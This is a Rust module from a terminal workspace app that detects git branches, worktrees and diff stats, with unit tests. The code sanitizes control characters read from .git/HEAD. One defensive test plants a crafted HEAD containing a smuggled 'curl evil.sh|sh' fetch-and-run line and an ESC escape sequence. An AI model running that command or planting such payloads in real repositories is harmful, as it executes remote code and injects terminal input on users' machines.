//! Git-metadata probing for workspace CWDs: branch detection, diff stats, and
//! worktree-aware `.git` lookup. All functions are pure (no shared mutable
//! state) and cross-platform - git subprocesses are bounded and non-interactive,
//! while branch detection reads `.git/HEAD` directly.
//!
//! Extracted from `workspace.rs` per US-030 of the src-app refactor PRD.

/// Git diff statistics for a workspace directory.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct GitDiffStats {
    pub files_changed: usize,
    pub insertions: usize,
    pub deletions: usize,
}

/// Wall-clock deadline for `git diff --shortstat` (U-035). A healthy repo
/// answers in well under a second; this bounds a dead/slow network mount or a
/// `.git/config` external helper that hangs.
const GIT_DIFF_STAT_DEADLINE: std::time::Duration = std::time::Duration::from_secs(10);

/// stdout cap for `git diff --shortstat` - the command emits a single summary
/// line, so 256 KiB is far beyond any real output while bounding a hijacked git.
const GIT_DIFF_STAT_STDOUT_CAP: u64 = 256 * 1024;

const EMPTY_TREE_SHA: &str = "4b825dc642cb6eb9a060e54bf8d69288fbee4904";
const GIT_DIFF_STAT_UNTRACKED_FILE_CAP: usize = 200;
const GIT_DIFF_STAT_UNTRACKED_PATH_CAP: usize = 1000;
const GIT_DIFF_STAT_FILE_BYTES_CAP: u64 = 512 * 1024;

impl GitDiffStats {
    /// Run a HEAD-relative diff stat in the given directory and parse the result.
    /// This matches the diff dock semantics: staged + unstaged tracked
    /// changes against `HEAD`, plus untracked files. On spawn failure, timeout, or
    /// nonzero git exit this returns the empty (`is_empty()`) default - the
    /// "stats unavailable" state the badge renders.
    pub fn from_cwd(cwd: &str) -> Self {
        let base = git_stdout(cwd, &["rev-parse", "--verify", "HEAD"])
            .map(|out| String::from_utf8_lossy(&out).trim().to_string())
            .filter(|base| !base.is_empty())
            .unwrap_or_else(|| EMPTY_TREE_SHA.to_string());

        let mut stats = git_stdout(cwd, &["diff", "--shortstat", &base, "--"])
            .map(|out| {
                let text = String::from_utf8_lossy(&out);
                Self::parse_shortstat(&text)
            })
            .unwrap_or_default();
        stats.add_untracked(cwd);
        stats
    }

    /// Parse `git diff --shortstat` output, e.g.:
    /// " 3 files changed, 42 insertions(+), 7 deletions(-)"
    fn parse_shortstat(text: &str) -> Self {
        let mut files_changed = 0usize;
        let mut insertions = 0usize;
        let mut deletions = 0usize;

        for part in text.split(',') {
            let trimmed = part.trim();
            if trimmed.contains("file") {
                if let Some(n) = trimmed.split_whitespace().next() {
                    files_changed = n.parse().unwrap_or(0);
                }
            } else if trimmed.contains("insertion") {
                if let Some(n) = trimmed.split_whitespace().next() {
                    insertions = n.parse().unwrap_or(0);
                }
            } else if trimmed.contains("deletion")
                && let Some(n) = trimmed.split_whitespace().next()
            {
                deletions = n.parse().unwrap_or(0);
            }
        }

        Self {
            files_changed,
            insertions,
            deletions,
        }
    }

    pub fn is_empty(&self) -> bool {
        self.files_changed == 0 && self.insertions == 0 && self.deletions == 0
    }

    fn add_untracked(&mut self, cwd: &str) {
        let Some(out) = git_stdout(cwd, &["ls-files", "--others", "--exclude-standard", "-z"])
        else {
            return;
        };
        let text = String::from_utf8_lossy(&out);
        let mut paths = text.split('\0').filter(|p| !p.is_empty());
        for (idx, path) in paths
            .by_ref()
            .take(GIT_DIFF_STAT_UNTRACKED_PATH_CAP)
            .enumerate()
        {
            self.files_changed += 1;
            if idx < GIT_DIFF_STAT_UNTRACKED_FILE_CAP {
                self.insertions += untracked_insertions(cwd, path);
            }
        }
        if paths.next().is_some() {
            self.files_changed += 1;
        }
    }
}

fn git_stdout(cwd: &str, args: &[&str]) -> Option<Vec<u8>> {
    let mut cmd = std::process::Command::new("git");
    cmd.args(args)
        .current_dir(cwd)
        // U-035: a hung credential/helper prompt would otherwise pin the
        // blocking-pool task. With no terminal git fails fast instead.
        .env("GIT_TERMINAL_PROMPT", "0");
    let output =
        paneflow_process::run_with_timeout(cmd, GIT_DIFF_STAT_DEADLINE, GIT_DIFF_STAT_STDOUT_CAP)
            .ok()?;
    output.status.success().then_some(output.stdout)
}

fn untracked_insertions(cwd: &str, rel_path: &str) -> usize {
    use std::io::Read;

    let path = std::path::Path::new(cwd).join(rel_path);
    match std::fs::symlink_metadata(&path) {
        Ok(meta) if meta.file_type().is_symlink() => std::fs::read_link(&path)
            .map(|target| text_line_count(&target.to_string_lossy()))
            .unwrap_or(0),
        Ok(_) => {
            let file = match std::fs::File::open(&path) {
                Ok(file) => file,
                Err(_) => return 0,
            };
            let mut bytes = Vec::new();
            if file
                .take(GIT_DIFF_STAT_FILE_BYTES_CAP + 1)
                .read_to_end(&mut bytes)
                .is_err()
                || bytes.len() as u64 > GIT_DIFF_STAT_FILE_BYTES_CAP
                || bytes.contains(&0)
            {
                return 0;
            }
            String::from_utf8(bytes)
                .map(|text| text_line_count(&text))
                .unwrap_or(0)
        }
        Err(_) => 0,
    }
}

fn text_line_count(text: &str) -> usize {
    if text.is_empty() {
        0
    } else {
        text.lines().count()
    }
}

/// Read up to `limit` bytes from a file, returning the content as a `String`.
/// Prevents unbounded reads from malicious or corrupted files.
pub(super) fn read_capped(path: &std::path::Path, limit: u64) -> std::io::Result<String> {
    use std::io::Read;
    let file = std::fs::File::open(path)?;
    let mut content = String::new();
    file.take(limit).read_to_string(&mut content)?;
    Ok(content)
}

/// Find the `.git` directory for a working directory.
///
/// Walks up from `cwd` to find the nearest `.git` entry. For worktrees (`.git`
/// is a file), follows the `gitdir:` pointer to return the actual git metadata
/// directory where `HEAD` and `index` reside.
pub fn find_git_dir(cwd: &str) -> Option<std::path::PathBuf> {
    let mut search_dir = std::path::Path::new(cwd);
    let git_path = loop {
        let candidate = search_dir.join(".git");
        if candidate.exists() {
            break candidate;
        }
        search_dir = search_dir.parent()?;
    };

    if git_path.is_file() {
        // Worktree: .git is a file containing "gitdir: <path>"
        let content = read_capped(&git_path, 512).ok()?;
        let gitdir = content.trim().strip_prefix("gitdir: ")?.to_owned();
        let gitdir_path = if std::path::Path::new(&gitdir).is_absolute() {
            std::path::PathBuf::from(&gitdir)
        } else {
            git_path
                .parent()
                .unwrap_or(std::path::Path::new(cwd))
                .join(&gitdir)
        };
        Some(gitdir_path)
    } else if git_path.is_dir() {
        Some(git_path)
    } else {
        None
    }
}

/// Canonicalize a path, falling back to the input when it cannot be resolved
/// (e.g. the path does not exist). Canonicalization is what lets two sibling
/// worktrees of the same repo produce an *identical* `repo_root`, since their
/// `commondir` pointers (`../..`) both collapse to the same absolute path.
fn canonicalize_or(path: &std::path::Path) -> std::path::PathBuf {
    std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf())
}

/// Lexically collapse `.`/`..` components without touching the filesystem.
///
/// US-056: a relative `commondir` (`../..`) joined onto a worktree git dir
/// yields a path littered with `..`. When the target exists `canonicalize_or`
/// resolves them, but on a missing/unresolvable path it returns the raw form -
/// so two sibling worktrees would *not* collapse to the same `repo_root`.
/// Normalizing first guarantees the best-effort fallback still collapses them.
/// This mirrors the component walk `canonicalize` performs, minus symlink
/// resolution (a leading `..` with nothing to pop is preserved verbatim).
fn normalize_lexically(path: &std::path::Path) -> std::path::PathBuf {
    use std::path::Component;
    let mut stack: Vec<Component> = Vec::new();
    for comp in path.components() {
        match comp {
            Component::CurDir => {}
            Component::ParentDir => match stack.last() {
                Some(Component::Normal(_)) => {
                    stack.pop();
                }
                _ => stack.push(comp),
            },
            other => stack.push(other),
        }
    }
    let mut out = std::path::PathBuf::new();
    for comp in stack {
        out.push(comp.as_os_str());
    }
    out
}

/// Resolve the shared (main) `.git` directory for a given worktree git dir.
///
/// For a linked worktree, `git_dir` is `<main>/.git/worktrees/<name>` and holds
/// a `commondir` file pointing - usually relatively, e.g. `../..` - at the
/// shared `<main>/.git`. For a normal checkout, `git_dir` is already the main
/// `.git` and no `commondir` file exists, so it is returned as-is. An absolute
/// `commondir` is honored verbatim (no double-join). Result is canonicalized
/// when the path exists, otherwise returned best-effort (never panics).
pub fn resolve_main_git_dir(git_dir: &std::path::Path) -> Option<std::path::PathBuf> {
    let commondir_file = git_dir.join("commondir");
    let main_git_dir = if commondir_file.is_file() {
        let content = read_capped(&commondir_file, 512).ok()?;
        let rel = content.trim();
        if rel.is_empty() {
            return None;
        }
        let p = std::path::Path::new(rel);
        if p.is_absolute() {
            p.to_path_buf()
        } else {
            normalize_lexically(&git_dir.join(p))
        }
    } else {
        git_dir.to_path_buf()
    };
    Some(canonicalize_or(&main_git_dir))
}

/// Resolve `(repo_root, is_worktree)` from a working directory's git dir.
///
/// - `repo_root`: the working directory of the shared repository (parent of the
///   main `.git`), canonicalized so sibling worktrees of one repo yield an
///   identical value - the key invariant for grouping siblings.
/// - `is_worktree`: true when `git_dir` is a *linked* worktree (it carries a
///   `commondir` file). The main checkout of a repo is not a worktree.
///
/// Never panics: a bare repo, a missing `commondir`, or an unresolvable path
/// degrades to a best-effort `repo_root` (possibly `None`).
pub fn resolve_repo_root(git_dir: &std::path::Path) -> (Option<std::path::PathBuf>, bool) {
    let is_worktree = git_dir.join("commondir").is_file();
    let repo_root = resolve_main_git_dir(git_dir)
        .and_then(|main_git| main_git.parent().map(|p| p.to_path_buf()));
    (repo_root, is_worktree)
}

/// Resolve the concrete worktree root for a workspace at construction time.
/// This lets UI code reuse stored metadata instead of reading `.git/worktrees`
/// files while rebuilding Review columns.
pub fn resolve_worktree_root(
    cwd: &str,
    git_dir: Option<&std::path::Path>,
    repo_root: Option<&std::path::Path>,
    is_worktree: bool,
) -> std::path::PathBuf {
    if !is_worktree {
        return repo_root
            .map(std::path::Path::to_path_buf)
            .unwrap_or_else(|| std::path::PathBuf::from(cwd));
    }

    let Some(git_dir) = git_dir else {
        return std::path::PathBuf::from(cwd);
    };
    let content = read_capped(&git_dir.join("gitdir"), 512).ok();
    let Some(raw) = content.as_deref().map(str::trim).filter(|s| !s.is_empty()) else {
        return std::path::PathBuf::from(cwd);
    };
    let git_file = std::path::Path::new(raw);
    let git_file = if git_file.is_absolute() {
        git_file.to_path_buf()
    } else {
        normalize_lexically(&git_dir.join(git_file))
    };
    git_file
        .parent()
        .map(canonicalize_or)
        .unwrap_or_else(|| std::path::PathBuf::from(cwd))
}

/// Parse branch name from a known `.git` directory's `HEAD` file.
///
/// Returns `(branch_name, true)`. On read failure returns `("", true)` -
/// the directory is a git repo but the branch is unknown.
/// Only `refs/heads/` branches are resolved; tags and remote refs return empty.
pub(super) fn parse_head(git_dir: &std::path::Path) -> (String, bool) {
    let head_path = git_dir.join("HEAD");
    let content = match read_capped(&head_path, 512) {
        Ok(c) => c,
        Err(_) => return (String::new(), true),
    };
    let content = content.trim();

    if let Some(branch) = content.strip_prefix("ref: refs/heads/") {
        // `content.trim()` only strips edge whitespace, so a crafted `.git/HEAD`
        // like `ref: refs/heads/main\n<payload>\n` leaves the interior `\n`/ESC
        // intact after `strip_prefix`. git resolves HEAD on its line-oriented
        // read, so the repo still diffs as `main` while this remainder carries
        // smuggled bytes into every `git_branch` consumer (sidebar, and the diff
        // review prompt that is written verbatim into a PTY with no bracketed
        // paste). Drop all control chars at this trust boundary: `is_control()`
        // covers C0 (incl. `\n`/`\r`/ESC 0x1b), DEL (0x7f), and C1 (0x80-0x9f).
        // Pure string filtering - identical on Linux, macOS, and Windows.
        (branch.chars().filter(|c| !c.is_control()).collect(), true)
    } else if content.chars().all(|c| c.is_ascii_hexdigit())
        && (content.len() == 40 || content.len() == 64)
    {
        // Detached HEAD - raw SHA-1 (40 chars) or SHA-256 (64 chars)
        let short = &content[..7];
        (format!("({short})"), true)
    } else {
        // Unrecognized format (tag ref, remote ref, corrupted) - git repo but branch unknown
        (String::new(), true)
    }
}

/// Detect the current git branch for a working directory.
///
/// Walks up from `cwd` to find `.git`, reads `HEAD` directly (no subprocess).
/// Returns `(branch_name, is_git_repo)`.
/// - Normal branch: `("main", true)`
/// - Detached HEAD: `("(abc1234)", true)`
/// - Not a git repo: `("", false)`
pub fn detect_branch(cwd: &str) -> (String, bool) {
    match find_git_dir(cwd) {
        Some(git_dir) => parse_head(&git_dir),
        None => (String::new(), false),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detect_branch_normal_branch() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(git_dir.join("HEAD"), "ref: refs/heads/main\n").unwrap();

        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
        assert_eq!(branch, "main");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_feature_branch() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(
            git_dir.join("HEAD"),
            "ref: refs/heads/feature/JIRA-123-oauth\n",
        )
        .unwrap();

        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
        assert_eq!(branch, "feature/JIRA-123-oauth");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_detached_head() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(
            git_dir.join("HEAD"),
            "96fa6899ea34697257e84865fefc56beb42d6390\n",
        )
        .unwrap();

        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
        assert_eq!(branch, "(96fa689)");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_not_a_git_repo() {
        let dir = tempfile::tempdir().unwrap();
        // No .git directory

        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
        assert_eq!(branch, "");
        assert!(!is_repo);
    }

    #[test]
    fn detect_branch_worktree_file() {
        let dir = tempfile::tempdir().unwrap();
        // Simulate a worktree: .git is a file pointing to a gitdir
        let worktree_git_dir = dir.path().join("worktree_git");
        std::fs::create_dir(&worktree_git_dir).unwrap();
        std::fs::write(worktree_git_dir.join("HEAD"), "ref: refs/heads/wt-branch\n").unwrap();

        let work_dir = dir.path().join("work");
        std::fs::create_dir(&work_dir).unwrap();
        std::fs::write(
            work_dir.join(".git"),
            format!("gitdir: {}\n", worktree_git_dir.display()),
        )
        .unwrap();

        let (branch, is_repo) = detect_branch(work_dir.to_str().unwrap());
        assert_eq!(branch, "wt-branch");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_nonexistent_directory() {
        let (branch, is_repo) = detect_branch("/nonexistent/path/that/does/not/exist");
        assert_eq!(branch, "");
        assert!(!is_repo);
    }

    #[test]
    fn detect_branch_worktree_relative_path() {
        let dir = tempfile::tempdir().unwrap();
        // Simulate a worktree with a relative gitdir path
        let worktree_git_dir = dir
            .path()
            .join("main_repo")
            .join(".git")
            .join("worktrees")
            .join("wt1");
        std::fs::create_dir_all(&worktree_git_dir).unwrap();
        std::fs::write(
            worktree_git_dir.join("HEAD"),
            "ref: refs/heads/relative-wt\n",
        )
        .unwrap();

        let work_dir = dir.path().join("wt1");
        std::fs::create_dir(&work_dir).unwrap();
        // Relative path from work_dir/.git to the worktree git dir
        std::fs::write(
            work_dir.join(".git"),
            "gitdir: ../main_repo/.git/worktrees/wt1\n",
        )
        .unwrap();

        let (branch, is_repo) = detect_branch(work_dir.to_str().unwrap());
        assert_eq!(branch, "relative-wt");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_subdirectory_of_repo() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(git_dir.join("HEAD"), "ref: refs/heads/develop\n").unwrap();

        // Create a subdirectory without its own .git
        let sub_dir = dir.path().join("src").join("module");
        std::fs::create_dir_all(&sub_dir).unwrap();

        let (branch, is_repo) = detect_branch(sub_dir.to_str().unwrap());
        assert_eq!(branch, "develop");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_strips_control_chars_from_malicious_head() {
        // A crafted `.git/HEAD` smuggles a newline + ESC payload after a valid
        // ref line. git itself resolves HEAD to `main` (line-oriented read), so
        // the repo still diffs and the Review button is reachable - but the
        // returned branch must never carry the injected `\n`/ESC bytes into the
        // PTY-bound review prompt or the sidebar.
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(
            git_dir.join("HEAD"),
            "ref: refs/heads/main\n`curl evil.sh|sh`\n\x1b]0;spoof\x07",
        )
        .unwrap();

        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
        assert!(is_repo);
        assert!(!branch.contains('\n'), "newline must be stripped");
        assert!(!branch.contains('\r'), "carriage return must be stripped");
        assert!(!branch.contains('\x1b'), "ESC must be stripped");
        assert!(branch.chars().all(|c| !c.is_control()));
        // Edge `trim()` already removed the trailing payload bytes after the
        // final `\n`; the interior smuggled line collapses onto `main`.
        assert!(branch.starts_with("main"));
    }

    #[test]
    fn find_git_dir_normal_repo() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();

        let result = find_git_dir(dir.path().to_str().unwrap());
        assert_eq!(result, Some(git_dir));
    }

    #[test]
    fn find_git_dir_not_a_repo() {
        let dir = tempfile::tempdir().unwrap();
        let result = find_git_dir(dir.path().to_str().unwrap());
        assert_eq!(result, None);
    }

    #[test]
    fn find_git_dir_worktree() {
        let dir = tempfile::tempdir().unwrap();
        let worktree_git_dir = dir
            .path()
            .join("main_repo")
            .join(".git")
            .join("worktrees")
            .join("wt1");
        std::fs::create_dir_all(&worktree_git_dir).unwrap();

        let work_dir = dir.path().join("wt1");
        std::fs::create_dir(&work_dir).unwrap();
        std::fs::write(
            work_dir.join(".git"),
            format!("gitdir: {}\n", worktree_git_dir.display()),
        )
        .unwrap();

        let result = find_git_dir(work_dir.to_str().unwrap());
        assert_eq!(result, Some(worktree_git_dir));
    }

    #[test]
    fn find_git_dir_subdirectory() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();

        let sub_dir = dir.path().join("src").join("lib");
        std::fs::create_dir_all(&sub_dir).unwrap();

        let result = find_git_dir(sub_dir.to_str().unwrap());
        assert_eq!(result, Some(git_dir));
    }

    #[test]
    fn resolve_repo_root_normal_repo() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();

        let (repo_root, is_worktree) = resolve_repo_root(&git_dir);
        assert!(!is_worktree);
        // repo_root is the canonicalized parent of `.git` (the repo working dir).
        assert_eq!(repo_root, Some(std::fs::canonicalize(dir.path()).unwrap()));
    }

    #[test]
    fn resolve_repo_root_worktree_relative_commondir() {
        let dir = tempfile::tempdir().unwrap();
        // Main repo at <root>/main, its .git at <root>/main/.git
        let main_git = dir.path().join("main").join(".git");
        std::fs::create_dir_all(&main_git).unwrap();
        // Linked worktree git dir at <root>/main/.git/worktrees/wt1
        let wt_git = main_git.join("worktrees").join("wt1");
        std::fs::create_dir_all(&wt_git).unwrap();
        // commondir points back to the main .git relatively: ../..
        std::fs::write(wt_git.join("commondir"), "../..\n").unwrap();

        let (repo_root, is_worktree) = resolve_repo_root(&wt_git);
        assert!(is_worktree);
        assert_eq!(
            repo_root,
            Some(std::fs::canonicalize(dir.path().join("main")).unwrap())
        );
    }

    #[test]
    fn resolve_repo_root_worktree_absolute_commondir() {
        let dir = tempfile::tempdir().unwrap();
        let main_git = dir.path().join("main").join(".git");
        std::fs::create_dir_all(&main_git).unwrap();
        let wt_git = main_git.join("worktrees").join("wt2");
        std::fs::create_dir_all(&wt_git).unwrap();
        // Absolute commondir must be honored verbatim (no double-join).
        std::fs::write(
            wt_git.join("commondir"),
            format!("{}\n", main_git.display()),
        )
        .unwrap();

        let (repo_root, is_worktree) = resolve_repo_root(&wt_git);
        assert!(is_worktree);
        assert_eq!(
            repo_root,
            Some(std::fs::canonicalize(dir.path().join("main")).unwrap())
        );
    }

    #[test]
    fn resolve_worktree_root_uses_stored_gitdir_pointer() {
        let dir = tempfile::tempdir().unwrap();
        let main_git = dir.path().join("main").join(".git");
        let worktree_root = dir.path().join("repo.worktrees").join("feat");
        let worktree_subdir = worktree_root.join("src");
        let wt_git = main_git.join("worktrees").join("feat");
        std::fs::create_dir_all(&worktree_subdir).unwrap();
        std::fs::create_dir_all(&wt_git).unwrap();
        std::fs::write(
            wt_git.join("gitdir"),
            format!("{}\n", worktree_root.join(".git").display()),
        )
        .unwrap();

        let root = resolve_worktree_root(
            worktree_subdir.to_str().unwrap(),
            Some(&wt_git),
            Some(&dir.path().join("main")),
            true,
        );

        assert_eq!(root, std::fs::canonicalize(worktree_root).unwrap());
    }

    #[test]
    fn resolve_repo_root_siblings_match() {
        // Two sibling worktrees of the same repo must produce an identical repo_root.
        let dir = tempfile::tempdir().unwrap();
        let main_git = dir.path().join("main").join(".git");
        std::fs::create_dir_all(&main_git).unwrap();
        let wt_a = main_git.join("worktrees").join("a");
        let wt_b = main_git.join("worktrees").join("b");
        std::fs::create_dir_all(&wt_a).unwrap();
        std::fs::create_dir_all(&wt_b).unwrap();
        std::fs::write(wt_a.join("commondir"), "../..\n").unwrap();
        std::fs::write(wt_b.join("commondir"), "../..\n").unwrap();

        let (root_a, _) = resolve_repo_root(&wt_a);
        let (root_b, _) = resolve_repo_root(&wt_b);
        assert!(root_a.is_some());
        assert_eq!(root_a, root_b);
    }

    #[test]
    fn normalize_lexically_collapses_dotdot() {
        // US-056: a relative commondir on a non-existent worktree must still
        // collapse `..` lexically so sibling worktrees resolve to the same
        // repo_root even when canonicalize can't (target missing on disk).
        let wt_git = std::path::Path::new("/nonexistent/main/.git/worktrees/wt1");
        assert_eq!(
            normalize_lexically(&wt_git.join("../..")),
            std::path::PathBuf::from("/nonexistent/main/.git")
        );
        // A leading `..` with nothing to pop is preserved verbatim.
        assert_eq!(
            normalize_lexically(std::path::Path::new("../foo/./bar")),
            std::path::PathBuf::from("../foo/bar")
        );
    }

    #[test]
    fn resolve_repo_root_missing_dir() {
        let (repo_root, is_worktree) = resolve_repo_root(std::path::Path::new("/nonexistent/.git"));
        assert!(!is_worktree);
        // Non-existent path: canonicalize fails, parent is still derivable.
        assert_eq!(repo_root, Some(std::path::PathBuf::from("/nonexistent")));
    }

    #[test]
    fn parse_shortstat_extracts_insertions_and_deletions() {
        let stats =
            GitDiffStats::parse_shortstat(" 3 files changed, 42 insertions(+), 7 deletions(-)");
        assert_eq!(stats.files_changed, 3);
        assert_eq!(stats.insertions, 42);
        assert_eq!(stats.deletions, 7);
        assert!(!stats.is_empty());

        // Singular "1 file changed" with only a deletion still parses the count.
        let single = GitDiffStats::parse_shortstat(" 1 file changed, 2 deletions(-)");
        assert_eq!(single.files_changed, 1);
        assert_eq!(single.insertions, 0);
        assert_eq!(single.deletions, 2);
    }

    #[test]
    fn from_cwd_on_non_repo_yields_unavailable_default() {
        // U-035: a non-git directory makes `git diff --shortstat` exit nonzero,
        // and the bounded run must fall back to the empty (`is_empty()`) default
        // - the "stats unavailable" badge state - rather than panic or hang.
        let dir = tempfile::tempdir().unwrap();
        let stats = GitDiffStats::from_cwd(dir.path().to_str().unwrap());
        assert!(
            stats.is_empty(),
            "non-repo should yield no stats, got {stats:?}"
        );
    }

    #[test]
    fn from_cwd_counts_staged_and_untracked_changes() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        if !test_git(root, &["init"]) {
            return;
        }
        assert!(test_git(root, &["config", "core.autocrlf", "false"]));
        std::fs::write(root.join("tracked.txt"), "one\n").unwrap();
        assert!(test_git(root, &["add", "tracked.txt"]));
        assert!(test_git(
            root,
            &[
                "-c",
                "user.email=paneflow@example.com",
                "-c",
                "user.name=Paneflow",
                "commit",
                "-m",
                "init",
            ],
        ));

        std::fs::write(root.join("tracked.txt"), "one\ntwo\n").unwrap();
        assert!(test_git(root, &["add", "tracked.txt"]));
        std::fs::write(root.join("untracked.txt"), "alpha\nbeta\n").unwrap();

        let stats = GitDiffStats::from_cwd(root.to_str().unwrap());
        assert_eq!(stats.files_changed, 2);
        assert_eq!(stats.insertions, 3);
        assert_eq!(stats.deletions, 0);
    }

    fn test_git(cwd: &std::path::Path, args: &[&str]) -> bool {
        std::process::Command::new("git")
            .args(args)
            .current_dir(cwd)
            .env("GIT_TERMINAL_PROMPT", "0")
            .output()
            .map(|out| out.status.success())
            .unwrap_or(false)
    }
}
